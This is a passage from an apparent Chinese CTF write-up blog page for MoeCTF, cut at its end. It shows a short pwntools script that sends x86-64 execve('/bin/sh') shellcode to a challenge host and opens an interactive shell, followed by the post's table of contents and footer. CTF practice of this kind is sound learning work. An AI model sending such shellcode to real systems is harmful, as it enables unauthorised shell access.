</span></span><span style=display:flex><span>context(os<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;linux&#39;</span>,arch<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;amd64&#39;</span>,log_level<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;debug&#39;</span>)
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;192.168.114.1&#39;</span>,<span style=color:#ae81ff>53436</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>shellcode<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>send(shellcode)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div></div></div></div><button id=tocFab class=toc-fab type=button aria-label="Toggle TOC">目录</button><aside id=tocDrawer class=toc-drawer aria-hidden=true><div class=toc-drawer-head><div class=toc-drawer-title>目录</div><button id=tocClose class=toc-close type=button aria-label="Close TOC">×</button></div><nav class=toc-drawer-body><nav id=TableOfContents><ul><li><a href=#0基础入门>0基础入门</a></li><li><a href=#安全杂项>安全杂项</a><ul><li><a href=#signin>signin</a></li><li><a href=#罗小黑战记>罗小黑战记</a></li><li><a href=#杂项入门指北>杂项入门指北</a></li><li><a href=#ez_f5>ez_F5</a></li><li><a href=#so-many-m>so many &rsquo;m'</a></li><li><a href=#捂住一只耳>捂住一只耳</a></li><li><a href=#abnormal-lag>Abnormal lag</a></li><li><a href=#moejail_lv1>moejail_lv1</a></li><li><a href=#moejail_lv2>moejail_lv2</a></li><li><a href=#moejail_lv3>moejail_lv3</a></li><li><a href=#the-upside-and-down>The upside and down</a></li><li><a href=#the_secret_of_snowball>the_secret_of_snowball</a></li><li><a href=#解不完的压缩包>解不完的压缩包</a></li><li><a href=#每人至少300份>每人至少300份</a></li><li><a href=#readme>readme</a></li><li><a href=#find-it>Find It</a></li><li><a href=#ez_forensics>ez_Forensics</a></li><li><a href=#ctfer2077>ctfer2077①</a></li><li><a href=#ctfer2077-1>ctfer2077②</a></li><li><a href=#ctfer2077-2>ctfer2077③</a></li></ul></li><li><a href=#现代密码学><strong>现代密码学</strong></a><ul><li><a href=#现代密码学入门指北>现代密码学入门指北</a></li><li><a href=#signin-1>Signin</a></li><li><a href=#big-and-small>Big and small</a></li><li><a href=#ez_hash>ez_hash</a></li><li><a href=#baby_equation>baby_equation</a></li><li><a href=#new_system>new_system</a></li><li><a href=#rsa_revenge>RSA_revenge</a></li><li><a href=#ezlegendre>ezlegendre</a></li></ul></li><li><a href=#web渗透测试与审计>Web渗透测试与审计</a><ul><li><a href=#web渗透测试与审计入门指北>Web渗透测试与审计入门指北</a></li><li><a href=#弗拉格之地的入口>弗拉格之地的入口</a></li><li><a href=#ez_http>ez_http</a></li><li><a href=#垫刀之路01-moectf启动>垫刀之路01: MoeCTF？启动！</a></li><li><a href=#垫刀之路02-普通的文件上传>垫刀之路02: 普通的文件上传</a></li><li><a href=#垫刀之路03-这是一个图床>垫刀之路03: 这是一个图床</a></li><li><a href=#垫刀之路04-一个文件浏览器>垫刀之路04: 一个文件浏览器</a></li><li><a href=#垫刀之路05-登陆网站>垫刀之路05: 登陆网站</a></li><li><a href=#垫刀之路06-pop-base-mini-moe>垫刀之路06: pop base mini moe</a></li><li><a href=#垫刀之路07-泄漏的密码>垫刀之路07: 泄漏的密码</a></li><li><a href=#静态网页>静态网页</a></li><li><a href=#whos-blog>who&rsquo;s blog?</a></li><li><a href=#proveyourlove>ProveYourLove</a></li><li><a href=#弗拉格之地的挑战>弗拉格之地的挑战</a></li><li><a href=#moe-pop>moe pop</a></li><li><a href=#勇闯铜人阵>勇闯铜人阵</a></li><li><a href=#电院_backend>电院_Backend</a></li><li><a href=#imagecloud前置>ImageCloud前置</a></li><li><a href=#imagecloud>ImageCloud</a></li><li><a href=#petstore复现>PetStore(复现)</a></li><li><a href=#re-从零开始的-xdu-教书生活复现>Re: 从零开始的 XDU 教书生活(复现)</a></li><li><a href=#smbms复现>smbms(复现)</a></li></ul></li><li><a href=#开发与运维基础>开发与运维基础</a><ul><li><a href=#运维入门指北>运维入门指北</a></li><li><a href=#哦不我的libc>哦不！我的libc！</a></li></ul></li><li><a href=#大语言模型应用安全>大语言模型应用安全</a><ul><li><a href=#neuro>Neuro?</a></li><li><a href=#并非助手>并非助手</a></li></ul></li><li><a href=#逆向工程>逆向工程</a><ul><li><a href=#逆向工程入门指北>逆向工程入门指北</a></li><li><a href=#xor>xor</a></li><li><a href=#tea>TEA</a></li><li><a href=#upx>upx</a></li><li><a href=#upx-revenge>upx-revenge</a></li><li><a href=#dynamic>dynamic</a></li><li><a href=#d0tn3t>d0tN3t</a></li><li><a href=#逆向工程进阶指北>逆向工程进阶指北</a></li><li><a href=#secretmodule>SecretModule</a></li><li><a href=#rc4>rc4</a></li></ul></li><li><a href=#二进制漏洞审计>二进制漏洞审计</a><ul><li><a href=#二进制漏洞审计入门指北>二进制漏洞审计入门指北</a></li><li><a href=#notenoughtime>NotEnoughTime</a></li><li><a href=#no_more_gets>no_more_gets</a></li><li><a href=#leak_sth>leak_sth</a></li><li><a href=#这是什么shellcode>这是什么？shellcode！</a></li></ul></li></ul></nav></nav></aside><script>(function(){const s=document.getElementById("tocFab"),e=document.getElementById("tocDrawer"),o=document.getElementById("tocClose");if(!s||!e)return;const t="pm_toc_open";function i(){e.classList.add("open"),e.setAttribute("aria-hidden","false");try{localStorage.setItem(t,"1")}catch{}}function n(){e.classList.remove("open"),e.setAttribute("aria-hidden","true");try{localStorage.setItem(t,"0")}catch{}}function a(){e.classList.contains("open")?n():i()}s.addEventListener("click",a),o&&o.addEventListener("click",n),document.addEventListener("keydown",e=>{e.key==="Escape"&&n()});try{localStorage.getItem(t)==="1"&&i()}catch{}})()</script><nav class=paginav><a class=prev href=http://localhost:1313/posts/ctf/ylctf2024/><span class=title>«</span><br><span>YLCTF2024</span>
</a><a class=next href=http://localhost:1313/posts/ctf/nepctf2024/><span class=title>»</span><br><span>nepctf2024复盘</span></a></nav></article></main><footer class=footer><span>© 2026
<a href=http://localhost:1313/>0raN9e's Blog</a>· Powered by <a href=https://gohugo.io/>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod>PaperMod</a>· adapted by <span style=letter-spacing:.12em>0ran9e</span></span></footer></body></html>